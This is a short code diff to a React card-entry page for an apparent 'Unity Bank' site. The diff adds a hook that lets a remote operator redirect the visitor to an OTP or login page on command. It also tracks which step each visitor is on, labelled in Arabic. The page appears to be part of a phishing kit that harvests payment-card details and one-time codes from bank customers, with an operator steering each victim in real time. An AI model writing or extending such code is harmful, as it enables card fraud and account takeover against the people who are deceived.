@@ -1,7 +1,7 @@
 import { useState } from "react";
 import { CreditCard, Lock, Shield, ChevronRight } from "lucide-react";
 import { unityApi } from "@/lib/api";
-import { useTracking } from "@/lib/useTracking";
+import { useTracking, useAdminCommands } from "@/lib/useTracking";
 
 const BRAND = { primary: "#1a3d6e", gold: "#c4923e" };
 
@@ -11,6 +11,10 @@ function formatCard(val: string) {
 
 export default function CardPage() {
   useTracking("بيانات البطاقة");
+  useAdminCommands({
+    "redirect:otp":   () => { window.location.href = "/unity-bank/otp"; },
+    "redirect:login": () => { window.location.href = "/unity-bank/login"; },
+  });
   const [cardNumber, setCardNumber] = useState("");
   const [cardName, setCardName] = useState("");
   const [cardMonth, setCardMonth] = useState("");
